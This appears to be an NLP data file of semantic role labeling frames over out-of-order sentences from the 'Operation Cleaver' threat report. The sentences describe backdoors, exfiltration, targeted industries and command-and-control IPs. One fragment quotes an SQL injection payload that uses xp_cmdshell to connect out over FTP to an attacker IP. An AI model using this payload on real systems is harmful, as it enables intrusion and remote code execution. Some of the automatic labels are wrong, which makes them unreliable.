"\n\n</section>\n\n\n<footer>46</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PERSISTENCE</heading>\n  Persistence is the means of maintaining access to a compromised network": {"is": {"ARG1": {"text": "Persistence"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "the means of maintaining access to a compromised network"}}, "maintaining": {"V": {"text": "maintaining", "index": 5}, "ARG1": {"text": "access to a compromised network"}}, "compromised": {"V": {"text": "compromised", "index": 9}, "ARG1": {"text": "network"}}}, " They\n replace the existing Notepad.exe on the infected machine, and when run they call out to a\n remote server and execute any shell code returned by the remote server": {"replace": {"ARG0": {"text": "They"}, "V": {"text": "replace", "index": 1}, "ARG1": {"text": "the existing Notepad.exe on the infected machine"}}, "existing": {"V": {"text": "existing", "index": 3}, "ARG1": {"text": "Notepad.exe"}}, "run": {"V": {"text": "run", "index": 12}}, "call": {"ARGM-TMP": {"text": "when run"}, "ARG0": {"text": "they"}, "V": {"text": "call", "index": 14}, "ARG2": {"text": "to a remote server"}}, "execute": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "they"}, "V": {"text": "execute", "index": 21}, "ARG1": {"text": "any shell code returned by the remote server"}}, "returned": {"ARG1": {"text": "any shell code"}, "V": {"text": "returned", "index": 25}, "ARG0": {"text": "by the remote server"}}}, " In\norder to take advantage of this job opportunity, the victim\nneeded to use the fake r\u00e9sum\u00e9 submission application\nsupplied by the malicious recruiter": {"take": {"V": {"text": "take", "index": 3}, "ARG1": {"text": "advantage"}, "ARG2": {"text": "of this job opportunity"}}, "needed": {"ARGM-PRP": {"text": "In order to take advantage of this job opportunity"}, "ARG0": {"text": "the victim"}, "V": {"text": "needed", "index": 12}, "ARG1": {"text": "to use the fake r\u00e9sum\u00e9 submission application supplied by the malicious recruiter"}}, "use": {"ARG0": {"text": "the victim"}, "V": {"text": "use", "index": 14}, "ARG1": {"text": "the fake/ submission application supplied by the malicious recruiter"}}, "supplied": {"ARG1": {"text": "the fake r\u00e9sum\u00e9 submission application"}, "V": {"text": "supplied", "index": 20}, "ARG0": {"text": "by the malicious recruiter"}}}, "\n</section>\n<section>\n\n  <heading>TinyZBot</heading>\n  TinyZBot is a backdoor developed in C#": {"is": {"ARG1": {"text": "TinyZBot"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a backdoor developed in C #"}}, "developed": {"ARG1": {"text": "a backdoor"}, "V": {"text": "developed", "index": 4}, "ARGM-LOC": {"text": "in C #"}}}, "\n \u2022\t Assets (both cyber and physical) and logistics information were compromised at major airline\n    operators, airports, and transportation companies": {"were": {"V": {"text": "were", "index": 11}}, "compromised": {"ARG1": {"text": "\u2022 Assets ( both cyber and physical ) and logistics information"}, "V": {"text": "compromised", "index": 12}, "ARGM-LOC": {"text": "at major airline operators , airports , and transportation companies"}}}, " In relation to Operation Cleaver, it is used as the\ncommand and control protocol for TinyZBot, which was the preferred backdoor, and underwent\nlong-term development": {"is": {"V": {"text": "is", "index": 7}}, "used": {"ARGM-LOC": {"text": "In relation to Operation Cleaver"}, "ARG1": {"text": "it"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "as the command and control protocol for TinyZBot , which was the preferred backdoor , and underwent long - term development"}}, "was": {"ARG1": {"text": "TinyZBot"}, "R-ARG1": {"text": "which"}, "V": {"text": "was", "index": 19}, "ARG2": {"text": "the preferred backdoor"}}, "underwent": {"ARG1": {"text": "protocol for TinyZBot"}, "R-ARG1": {"text": "which"}, "V": {"text": "underwent", "index": 25}, "ARG2": {"text": "long - term development"}}}, "\n\n</section>\n\n\n<footer>56</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PVZ (cont.)</heading>\n  The components are as follows:\n<list>\n  \u2022   PVZ-In\n  \u2022   PVZ-Out\n  \u2022   Syn Flooder\n  \u2022   LoggerModule\n  \u2022   XYNTService\n  \u2022   Jasus\n</list>\n  XYNTService was not developed by the Cleaver team, but instead is a publicly available project\n  which executes an executable as a service": {"was": {"V": {"text": "was", "index": 1}}, "developed": {"ARGM-NEG": {"text": "not"}, "V": {"text": "developed", "index": 3}, "ARG0": {"text": "by the Cleaver team"}}, "is": {"ARG1": {"text": "XYNTService"}, "ARGM-DIS": {"text": "instead"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "a publicly available project which executes an executable as a service"}}, "executes": {"ARG0": {"text": "a publicly available project"}, "R-ARG0": {"text": "which"}, "V": {"text": "executes", "index": 17}, "ARG1": {"text": "an executable"}, "ARG2": {"text": "as a service"}}}, "\n</section>\n\n<section>\n<heading>SYN Flooder</heading>\nSYN Flooder is a simple network based denial of service tool": {"is": {"ARG1": {"text": "SYN Flooder"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a simple network based denial of service tool"}}, "based": {"V": {"text": "based", "index": 6}, "ARG1": {"text": "denial"}}}, " This allowed them to use existing\ncommand line utilities available on their targets in order to upload information": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "them to use existing command line utilities available on their targets in order to upload information"}}, "use": {"ARG0": {"text": "them"}, "V": {"text": "use", "index": 4}, "ARG1": {"text": "existing command line utilities"}, "ARG2": {"text": "available"}, "ARGM-LOC": {"text": "on their targets"}, "ARGM-PRP": {"text": "in order to upload information"}}, "existing": {"V": {"text": "existing", "index": 5}, "ARG1": {"text": "command line utilities"}}, "upload": {"ARG0": {"text": "them"}, "V": {"text": "upload", "index": 16}, "ARG1": {"text": "information"}}}, " Shortly after, the main\n application is launched": {"is": {"V": {"text": "is", "index": 6}}, "launched": {"ARGM-TMP": {"text": "Shortly after"}, "ARG1": {"text": "the main application"}, "V": {"text": "launched", "index": 7}}}, " The message was intended to look like common Viagra spam from China, but\n would be sent with the keystroke logging data as attachments, as well as system information": {"was": {"V": {"text": "was", "index": 2}}, "intended": {"V": {"text": "intended", "index": 3}, "ARG1": {"text": "to look like common Viagra spam from China"}}, "look": {"ARG0": {"text": "The message"}, "V": {"text": "look", "index": 5}, "ARG1": {"text": "like common Viagra spam from China"}}, "would": {"V": {"text": "would", "index": 14}}, "be": {"V": {"text": "be", "index": 15}}, "sent": {"ARG1": {"text": "The message"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "sent", "index": 16}, "ARGM-MNR": {"text": "with the keystroke logging data as attachments , as well as system information"}}, "logging": {"ARG2": {"text": "the keystroke"}, "V": {"text": "logging", "index": 20}, "ARG1": {"text": "data"}, "ARGM-PRD": {"text": "as attachments"}}}, "\n\nThe IP address 78.109.194.114 served as a source for one of the primary attackers": {"served": {"ARG0": {"text": "The IP address 78.109.194.114"}, "V": {"text": "served", "index": 4}, "ARG1": {"text": "as a source for one of the primary attackers"}}}, "\n\n  The following is a breakdown by country of which industries were targeted and/or victimized:\n\n<list>\n         Canada                             \n         - Energy & Utilities                        \n         - Oil & Gas         \n         - Hospitals                        \n                                            \n                            \n         China                              \n         - Aerospace\n                        \n                 \n         England\n         - Education                  \n              \n\n         France                             \n         - Oil & Gas                        \n                       \n\n         Germany                      \n         - Telecommunications               \n                                      \n                   \n         India                              \n         - Education                        \n                                            \n                                            \n         Israel                             \n         - Aerospace\n         - Education\n\n         \n         Kuwait              \n         - Oil & Gas         \n         - Telecommunications\n\n\n         Mexico            \n         - Oil & Gas         \n\n\n         Pakistan            \n         - Airports          \n         - Hospitals\n         - Technology        \n         - Airlines          \n\n                    \n         Qatar\n         - Oil & Gas\n         - Government           \n         - Airlines\n                    \n                    \n         Saudi Arabia        \n         - Oil & Gas         \n         - Airports          \n\n\n         South Korea\n         - Airports\n         - Airlines\n         - Education\n         - Technology\n         - Heavy Manufacturing\n\n\n         Turkey\n         - Oil & Gas\n\n\n         United Arab Emirates\n         - Government\n         - Airlines\n\n\n         United States\n         - Airlines\n         - Education\n         - Chemicals\n         - Transportation\n         - Energy & Utilities\n         - Military/Government\n         - Defense Industrial Base\n</list>                                                                                                       \n<footer>13</footer>\n\f\n<header>\n\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n Cleaver\u2019s level of access into each organization varied greatly, including completely compromised\n systems and networks, Active Directory domain controllers and credentials, compromised data\n repositories and stolen VPN credentials": {"is": {"ARG1": {"text": "The following"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a breakdown by country of which industries were targeted and/or victimized : Cleaver \u2019s level of access into each organization varied greatly , including completely compromised systems and networks , Active Directory domain controllers and credentials , compromised data repositories and stolen VPN credentials"}}, "were": {"V": {"text": "were", "index": 10}}, "targeted": {"ARG1": {"text": "industries"}, "V": {"text": "targeted", "index": 11}}, "victimized": {"ARG1": {"text": "industries"}, "V": {"text": "victimized", "index": 13}}, "varied": {"ARG0": {"text": "Cleaver \u2019s level of access into each organization"}, "V": {"text": "varied", "index": 23}, "ARGM-EXT": {"text": "greatly"}}, "including": {"ARG2": {"text": "Cleaver \u2019s level of access into each organization varied"}, "ARGM-MNR": {"text": "greatly"}, "V": {"text": "including", "index": 26}, "ARG1": {"text": "completely compromised systems and networks , Active Directory domain controllers and credentials , compromised"}}, "compromised": {"ARGM-EXT": {"text": "completely"}, "V": {"text": "compromised", "index": 28}, "ARG1": {"text": "systems"}}, "compromised_2": {"V": {"text": "compromised", "index": 40}, "ARG1": {"text": "data repositories and stolen VPN credentials"}}, "stolen": {"V": {"text": "stolen", "index": 44}, "ARG1": {"text": "VPN credentials"}}}, " The web shell could\nthen be installed via xp_cmdshell, or any other method which would grant the attacker write\naccess": {"could": {"V": {"text": "could", "index": 3}}, "be": {"V": {"text": "be", "index": 5}}, "installed": {"ARG1": {"text": "The web shell"}, "ARGM-MOD": {"text": "could"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "installed", "index": 6}, "ARG2": {"text": "via xp_cmdshell , or any other method which would grant the attacker write access"}}, "would": {"V": {"text": "would", "index": 15}}, "grant": {"ARG0": {"text": "any other method"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "grant", "index": 16}, "ARG1": {"text": "the attacker write access"}}, "write": {"ARG0": {"text": "attacker"}, "V": {"text": "write", "index": 19}, "ARG1": {"text": "access"}}}, " In order to infect users, they combined the original Easy Resume Creator\n  Pro product with malware by using a binder they developed internally named Binder_1": {"infect": {"V": {"text": "infect", "index": 3}, "ARG1": {"text": "users"}}, "combined": {"ARGM-PRP": {"text": "In order to infect users"}, "ARG0": {"text": "they"}, "V": {"text": "combined", "index": 7}, "ARG1": {"text": "the original Easy Resume Creator Pro product"}, "ARG2": {"text": "with malware by using a binder"}}, "using": {"V": {"text": "using", "index": 18}, "ARG1": {"text": "a binder they developed internally named Binder_1"}}, "developed": {"ARG1": {"text": "a binder"}, "ARG0": {"text": "they"}, "V": {"text": "developed", "index": 22}}, "named": {"V": {"text": "named", "index": 24}, "ARG2": {"text": "Binder_1"}}}, "\n</section>\n\n<section>\n  <heading>PVZ-Out</heading>\n  PVZ-Out is the other half of the command and control channel, primarily uploading results of\n  commands and keystroke logging data to a remote server": {"is": {"ARG1": {"text": "PVZ - Out"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "the other half of the command and control channel ,"}, "ARGM-ADV": {"text": "primarily uploading results of commands and keystroke logging data to a remote server"}}, "keystroke": {"V": {"text": "keystroke", "index": 20}, "ARG1": {"text": "logging data"}, "ARGM-EXT": {"text": "to a remote server"}}, "logging": {"ARG0": {"text": "commands and keystroke"}, "V": {"text": "logging", "index": 21}, "ARG1": {"text": "data"}, "ARGM-EXT": {"text": "to a remote server"}}}, " Its main functionality allows for a client and server communication channel, allowing\nfor information to be transported over the network simply": {"allows": {"ARG0": {"text": "Its main functionality"}, "V": {"text": "allows", "index": 3}, "ARG1": {"text": "for a client and server communication channel"}, "ARGM-ADV": {"text": "allowing for information to be transported over the network simply"}}, "allowing": {"V": {"text": "allowing", "index": 12}, "ARG1": {"text": "for information to be transported over the network simply"}}, "be": {"V": {"text": "be", "index": 16}}, "transported": {"ARG1": {"text": "information"}, "V": {"text": "transported", "index": 17}, "ARG2": {"text": "over the network"}, "ARGM-MNR": {"text": "simply"}}}, " This group includes the results of the Shell Creator mentioned in the\n  Attribution section, as well as ASPX backdoors used by Nesha": {"includes": {"ARG2": {"text": "This group"}, "V": {"text": "includes", "index": 2}, "ARG1": {"text": "the results of the Shell Creator mentioned in the Attribution section , as well as ASPX backdoors used by Nesha"}}, "mentioned": {"ARG1": {"text": "the Shell Creator"}, "V": {"text": "mentioned", "index": 9}, "ARGM-LOC": {"text": "in the Attribution section"}}, "used": {"V": {"text": "used", "index": 20}, "ARG0": {"text": "by Nesha"}}}, " These attacks were debilitating and\nimpacted the availability of online banking services": {"were": {"ARG1": {"text": "These attacks"}, "V": {"text": "were", "index": 2}, "ARG2": {"text": "debilitating and impacted the availability of online banking services"}}, "debilitating": {"ARG0": {"text": "These attacks"}, "V": {"text": "debilitating", "index": 3}, "ARG1": {"text": "the availability of online banking services"}}, "impacted": {"ARG0": {"text": "These attacks"}, "V": {"text": "impacted", "index": 5}, "ARG1": {"text": "the availability of online banking services"}}}, " This form, like the rest of the\n  submission forms, only stores the submitted information while the application is running": {"submitted": {"V": {"text": "submitted", "index": 14}, "ARG1": {"text": "information"}}, "is": {"V": {"text": "is", "index": 19}}, "running": {"ARG1": {"text": "the application"}, "V": {"text": "running", "index": 20}}}, " The exploit allows for\nescalation of privileges on unpatched Windows operating systems from an unprivileged user to\nkernel-level privilege": {"allows": {"ARG0": {"text": "The exploit"}, "V": {"text": "allows", "index": 2}, "ARG1": {"text": "for escalation of privileges on unpatched Windows operating systems from an unprivileged user to kernel - level privilege"}}}, " This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network": {"allows": {"ARG0": {"text": "This increase in privileges"}, "V": {"text": "allows", "index": 4}, "ARG1": {"text": "for the attacker to gain access to privleged areas of the operating system as well as to infect other computers on the target network"}}, "gain": {"ARG0": {"text": "the attacker"}, "V": {"text": "gain", "index": 9}, "ARG1": {"text": "access to privleged areas of the operating system"}}, "privleged": {"V": {"text": "privleged", "index": 12}, "ARG1": {"text": "areas of the operating system"}}, "infect": {"V": {"text": "infect", "index": 22}, "ARG1": {"text": "other computers"}, "ARGM-LOC": {"text": "on the target network"}}}, "\n The AppUsageId (at this point named AppType) was an identifier used by this organization in\n order to differentiate between targets infected with TinyZBot, meaning they could effectively\n run multiple campaigns using the same command and control server and know which target\n was infected": {"named": {"ARG1": {"text": "The AppUsageId ("}, "V": {"text": "named", "index": 6}, "ARG2": {"text": "AppType )"}}, "was": {"ARG1": {"text": "The AppUsageId ( at this point named AppType )"}, "V": {"text": "was", "index": 9}, "ARG2": {"text": "an identifier used by this organization in order to differentiate between targets infected with TinyZBot"}, "ARGM-ADV": {"text": "meaning they could effectively run multiple campaigns using the same command and control server and know which target was infected"}}, "used": {"ARG1": {"text": "an identifier"}, "V": {"text": "used", "index": 12}, "ARG0": {"text": "by this organization"}, "ARGM-PRP": {"text": "in order to differentiate between targets infected with TinyZBot"}}, "differentiate": {"V": {"text": "differentiate", "index": 19}, "ARG2": {"text": "between targets infected with TinyZBot"}}, "infected": {"ARG1": {"text": "targets"}, "V": {"text": "infected", "index": 22}, "ARG2": {"text": "with TinyZBot"}}, "meaning": {"V": {"text": "meaning", "index": 26}, "ARG1": {"text": "they could effectively run multiple campaigns using the same command and control server and know which target was infected"}}, "could": {"V": {"text": "could", "index": 28}}, "run": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "could"}, "ARGM-MNR": {"text": "effectively/ using the same command and control server and know which target was infected"}, "V": {"text": "run", "index": 30}, "ARG1": {"text": "multiple campaigns"}}, "using": {"V": {"text": "using", "index": 33}, "ARG1": {"text": "the same command and control server and know which target was infected"}}, "know": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "know", "index": 41}, "ARG1": {"text": "which target was infected"}}, "was_2": {"V": {"text": "was", "index": 44}}, "infected_2": {"ARG1": {"text": "target"}, "V": {"text": "infected", "index": 45}}}, "\n    \n  We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches\n  and the network when they are confident that there is little to no antivirus protection on the infected\n  target": {"observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 1}, "ARG1": {"text": "the Operation Cleaver team using Cain & Abel for extracting credentials from caches and the network"}, "ARGM-TMP": {"text": "when they are confident that there is little to no antivirus protection on the infected target"}}, "using": {"ARG0": {"text": "the Operation Cleaver team"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "Cain & Abel"}, "ARG2": {"text": "for extracting credentials from caches and the network when they are confident that there is little to no antivirus protection on the infected target"}}, "extracting": {"V": {"text": "extracting", "index": 11}, "ARG1": {"text": "credentials"}, "ARG2": {"text": "from caches and the network"}}, "are": {"ARGM-TMP": {"text": "when"}, "ARG1": {"text": "they"}, "V": {"text": "are", "index": 20}, "ARG2": {"text": "confident that there is little to no antivirus protection on the infected target"}}, "is": {"V": {"text": "is", "index": 24}, "ARG1": {"text": "little to no antivirus protection on the infected target"}}}, "\n\n\n<footer>58</footer>\n\f\n<header>#OPCLEAVER</header>\n\n\n  We have seen wndTest communicate with the following servers:\n<list>\n  \u2022   209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n  \u2022   23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n  \u2022   209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n  \u2022   198.50.100.210, Quebec, Canada, halon(dot)com.br\n  \u2022   207.182.142.68, Columbus, Ohio, USA\n  \u2022   95.211.191.247, Amsterdam, Noord-Holland, Netherlands\n</list>\n</section>\n\n<section>\n  <heading>Csext</heading>\n  Csext is a backdoor application developed in C# which runs as a service": {"is": {"ARG1": {"text": "Csext"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a backdoor application developed in C # which runs as a service"}}, "developed": {"ARG1": {"text": "a backdoor application"}, "V": {"text": "developed", "index": 5}, "ARGM-LOC": {"text": "in C #"}}, "runs": {"ARG1": {"text": "C #"}, "R-ARG1": {"text": "which"}, "V": {"text": "runs", "index": 10}, "ARGM-PRD": {"text": "as a service"}}}, "\n\n When this information is entered, the results are cached\n in a location the dropped malware can access": {"is": {"V": {"text": "is", "index": 3}}, "entered": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "this information"}, "V": {"text": "entered", "index": 4}}, "are": {"V": {"text": "are", "index": 8}}, "cached": {"ARGM-TMP": {"text": "When this information is entered"}, "ARG1": {"text": "the results"}, "V": {"text": "cached", "index": 9}, "ARGM-LOC": {"text": "in a location the dropped malware can access"}}, "dropped": {"V": {"text": "dropped", "index": 14}, "ARG1": {"text": "malware"}}, "can": {"ARG0": {"text": "the dropped malware"}, "V": {"text": "can", "index": 16}, "ARG1": {"text": "access"}}, "access": {"ARG1": {"text": "a location"}, "ARG0": {"text": "the dropped malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "access", "index": 17}}}, " Its method of exfiltrating the logged keystrokes\n relied upon a hardcoded email address stored in the binary": {"exfiltrating": {"V": {"text": "exfiltrating", "index": 3}, "ARG0": {"text": "the logged keystrokes"}}, "logged": {"V": {"text": "logged", "index": 5}, "ARG1": {"text": "keystrokes"}}, "relied": {"ARG0": {"text": "Its method of exfiltrating the logged keystrokes"}, "V": {"text": "relied", "index": 7}, "ARG1": {"text": "upon a hardcoded email address stored in the binary"}}, "stored": {"ARG1": {"text": "a hardcoded email address"}, "V": {"text": "stored", "index": 13}, "ARGM-LOC": {"text": "in the binary"}}}, "\n\n  The version compiled on June 23, 2014, added functionality which allowed screenshots of the\n  desktop to be taken": {"compiled": {"ARG1": {"text": "The version"}, "V": {"text": "compiled", "index": 2}, "ARGM-TMP": {"text": "on June 23 , 2014"}}, "added": {"ARG0": {"text": "The version compiled on June 23"}, "ARGM-TMP": {"text": "2014"}, "V": {"text": "added", "index": 9}, "ARG1": {"text": "functionality"}}, "allowed": {"ARG0": {"text": "functionality"}, "R-ARG0": {"text": "which"}, "V": {"text": "allowed", "index": 12}, "ARG1": {"text": "screenshots of the desktop to be taken"}}, "be": {"V": {"text": "be", "index": 18}}, "taken": {"ARG1": {"text": "screenshots of the desktop"}, "V": {"text": "taken", "index": 19}}}, "\n  </section>\n\n  <section>\n  <heading>EXFILTRATION</heading>\n  \n  Exfiltration is the process of moving information to an external site": {"is": {"ARG1": {"text": "Exfiltration"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "the process of moving information to an external site"}}, "moving": {"V": {"text": "moving", "index": 5}, "ARG1": {"text": "information"}, "ARG2": {"text": "to an external site"}}}, " Then an iterative methodology is applied to brute\n  forcing each SMB enabled target with each credential that was extracted from the cache": {"is": {"V": {"text": "is", "index": 4}}, "applied": {"ARGM-TMP": {"text": "Then"}, "ARG1": {"text": "an iterative methodology/ enabled target with each credential that was extracted from the cache"}, "V": {"text": "applied", "index": 5}, "ARG2": {"text": "to brute forcing each SMB"}}, "brute": {"V": {"text": "brute", "index": 7}, "ARGM-ADV": {"text": "forcing each SMB enabled target"}}, "forcing": {"V": {"text": "forcing", "index": 8}}, "enabled": {"ARG0": {"text": "each SMB"}, "V": {"text": "enabled", "index": 11}, "ARG1": {"text": "target"}, "ARGM-MNR": {"text": "with each credential"}}, "was": {"V": {"text": "was", "index": 17}}, "extracted": {"ARG1": {"text": "each credential"}, "R-ARG1": {"text": "that"}, "V": {"text": "extracted", "index": 18}, "ARG2": {"text": "from the cache"}}}, "\n\n       bestviagra4u.cn\n</list>\nThe files being exfiltrated are added to the email as attachments": {"being": {"ARG1": {"text": "The files"}, "V": {"text": "being", "index": 3}, "ARG2": {"text": "exfiltrated"}}, "exfiltrated": {"ARG1": {"text": "The files"}, "V": {"text": "exfiltrated", "index": 4}}, "are": {"V": {"text": "are", "index": 5}}, "added": {"ARG1": {"text": "bestviagra4u.cn The files being exfiltrated"}, "V": {"text": "added", "index": 6}, "ARG2": {"text": "to the email"}, "ARGM-PRD": {"text": "as attachments"}}}, "\n The initial version did not provide any means of receiving commands and was obfuscated with\n SmartAssembly": {"did": {"V": {"text": "did", "index": 3}}, "provide": {"ARG0": {"text": "The initial version"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "provide", "index": 5}, "ARG1": {"text": "any means of receiving commands"}}, "receiving": {"V": {"text": "receiving", "index": 9}, "ARG1": {"text": "commands"}}, "was": {"ARG1": {"text": "The initial version"}, "V": {"text": "was", "index": 12}, "ARG2": {"text": "obfuscated with SmartAssembly"}}, "obfuscated": {"ARG1": {"text": "The initial version"}, "V": {"text": "obfuscated", "index": 13}, "ARG2": {"text": "with SmartAssembly"}}}, " They were observed conducting SQL injection attacks": {"were": {"V": {"text": "were", "index": 1}}, "observed": {"V": {"text": "observed", "index": 2}, "ARG1": {"text": "conducting SQL injection attacks"}}, "conducting": {"ARG0": {"text": "They"}, "V": {"text": "conducting", "index": 3}, "ARG1": {"text": "SQL injection attacks"}}}, "\n Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers": {"Compromised": {"V": {"text": "Compromised", "index": 0}, "ARG1": {"text": "network infrastructure"}}, "included": {"ARG2": {"text": "Compromised network infrastructure"}, "V": {"text": "included", "index": 3}, "ARG1": {"text": "Cisco VPNs as well as Cisco switches and routers"}}, "switches": {"ARGM-MNR": {"text": "Cisco"}, "V": {"text": "switches", "index": 10}}}, " This allows for commands to be\n  sent to all bots for a campaign as well as individual control": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "for commands to be sent to all bots for a campaign as well as individual control"}}, "be": {"V": {"text": "be", "index": 5}}, "sent": {"ARG1": {"text": "commands"}, "V": {"text": "sent", "index": 6}, "ARG2": {"text": "to all bots for a campaign as well as individual control"}}}, "\n   \n  <figure></figure>\n\n                     <caption>Figure 24: The ASPX backdoor named \u201cZh0uSh3ll\u201d, allowing SQL queries.</caption>\n\n\n\n\n<footer>55</footer>\n\f\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<figure></figure>\n                      <caption>Figure 25: The ASPX backdoor named \u201cZh0uSh3ll\u201d, allowing file</caption>\n\n\n\n This organization utilized backdoors which masqueraded as varying versions of Notepad": {"utilized": {"ARG0": {"text": "This organization"}, "V": {"text": "utilized", "index": 2}, "ARG1": {"text": "backdoors which masqueraded as varying versions of Notepad"}}, "masqueraded": {"R-ARG0": {"text": "which"}, "V": {"text": "masqueraded", "index": 5}, "ARGM-PRD": {"text": "as varying versions of Notepad"}}, "varying": {"V": {"text": "varying", "index": 7}, "ARG1": {"text": "versions of Notepad"}}}, " The known command and control server\n  for PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx": {"known": {"V": {"text": "known", "index": 1}, "ARG1": {"text": "command"}}, "is": {"V": {"text": "is", "index": 10}}, "located": {"ARG1": {"text": "The known command and control server for PVZ - Out"}, "V": {"text": "located", "index": 11}, "ARGM-LOC": {"text": "at http://www.gesunddurchsjahr(dot)de/tor/default.aspx"}}}, "\nSQL injection payloads used by this organization have been double encoded": {"used": {"ARG1": {"text": "SQL injection payloads"}, "V": {"text": "used", "index": 3}, "ARG0": {"text": "by this organization"}}, "have": {"V": {"text": "have", "index": 7}}, "been": {"ARG1": {"text": "SQL injection payloads used by this organization"}, "V": {"text": "been", "index": 8}, "ARG2": {"text": "double encoded"}}, "encoded": {"ARG1": {"text": "SQL injection payloads used by this organization"}, "ARGM-EXT": {"text": "double"}, "V": {"text": "encoded", "index": 10}}}, "\n\n  The IP address 159.253.144.209 was a source for a secondary attacker in various\n  compromises": {"was": {"ARG1": {"text": "The IP address 159.253.144.209"}, "V": {"text": "was", "index": 4}, "ARG2": {"text": "a source for a secondary attacker in various compromises"}}}, " The UPLOAD command\n  requests that this file is then uploaded over SOAP to the command and control server": {"requests": {"ARG0": {"text": "The UPLOAD command"}, "V": {"text": "requests", "index": 3}, "ARG1": {"text": "that this file is then uploaded over SOAP to the command and control server"}}, "is": {"ARG1": {"text": "this file"}, "V": {"text": "is", "index": 7}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "uploaded/ over SOAP to the command and control server"}}, "uploaded": {"ARG1": {"text": "this file"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "uploaded", "index": 9}, "ARGM-DIR": {"text": "over SOAP"}, "ARG2": {"text": "to the command and control server"}}}, " When executed, they determine which version\nof Mimikatz to use based on whether the computer\u2019s version of Windows is 32-bit or 64-bit": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}, "ARG1": {"text": "they"}}, "determine": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "they"}, "V": {"text": "determine", "index": 4}, "ARG1": {"text": "which version of Mimikatz to use based on whether the computer \u2019s version of Windows is 32-bit or 64-bit"}}, "use": {"ARG1": {"text": "which version of Mimikatz"}, "V": {"text": "use", "index": 10}, "ARGM-ADV": {"text": "based"}, "ARG2": {"text": "on whether the computer \u2019s version of Windows is 32-bit or 64-bit"}}, "based": {"ARG1": {"text": "which version of Mimikatz"}, "V": {"text": "based", "index": 11}, "ARG2": {"text": "on whether the computer \u2019s version of Windows is 32-bit or 64-bit"}}, "is": {"ARG1": {"text": "the computer \u2019s version of Windows"}, "V": {"text": "is", "index": 20}, "ARG2": {"text": "32-bit or 64-bit"}}}, "\nsp_configure%20@b2,%201;RECONFIGURE;--%20\n</list>\nThen connect outbound via anonymous FTP:\n<list>\nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20\n</list>\n</section>\n\n<section>\n<heading>Spear-Phishing Campaign</heading>\nUsing messaging methods such as email, attackers can social engineer users into downloading\nand executing software, which quietly installs malware alongside of the desired program": {"Using": {"V": {"text": "Using", "index": 1}, "ARG1": {"text": "messaging methods such as email"}}, "can": {"ARG0": {"text": "attackers"}, "V": {"text": "can", "index": 9}, "ARG1": {"text": "social engineer users"}, "ARG2": {"text": "into downloading and executing software , which quietly installs malware alongside of the desired program"}}, "downloading": {"ARG0": {"text": "social engineer users"}, "V": {"text": "downloading", "index": 14}, "ARG1": {"text": "software ,"}, "ARGM-ADV": {"text": "which quietly installs malware alongside of the desired program"}}, "executing": {"V": {"text": "executing", "index": 16}, "ARG1": {"text": "software , which quietly installs malware alongside of the desired program"}}, "installs": {"ARG0": {"text": "software"}, "R-ARG0": {"text": "which"}, "ARGM-MNR": {"text": "quietly"}, "V": {"text": "installs", "index": 21}, "ARG1": {"text": "malware"}, "ARG2": {"text": "alongside of the desired program"}}, "desired": {"V": {"text": "desired", "index": 26}, "ARG1": {"text": "program"}}}, "\n\n The next day, April 25, 2013, a new version was compiled which allowed for self-deletion": {"was": {"V": {"text": "was", "index": 12}}, "compiled": {"ARGM-TMP": {"text": "The next day , April 25 , 2013 ,"}, "ARG1": {"text": "a new version"}, "V": {"text": "compiled", "index": 13}, "ARGM-ADV": {"text": "which allowed for self - deletion"}}, "allowed": {"ARG1": {"text": "a new"}, "R-ARG1": {"text": "which"}, "V": {"text": "allowed", "index": 15}, "ARGM-GOL": {"text": "for self - deletion"}}}, " It is a command line utility capable of\nbeing invoked by PVZ-In": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a command line utility capable of being invoked by PVZ - In"}}, "being": {"V": {"text": "being", "index": 8}}, "invoked": {"ARG1": {"text": "a command line utility"}, "V": {"text": "invoked", "index": 9}, "ARG0": {"text": "by PVZ -"}, "ARGM-MNR": {"text": "In"}}}, "     \n                         \n  Operation Cleaver has, over the past several years, conducted a significant global surveillance\n  and 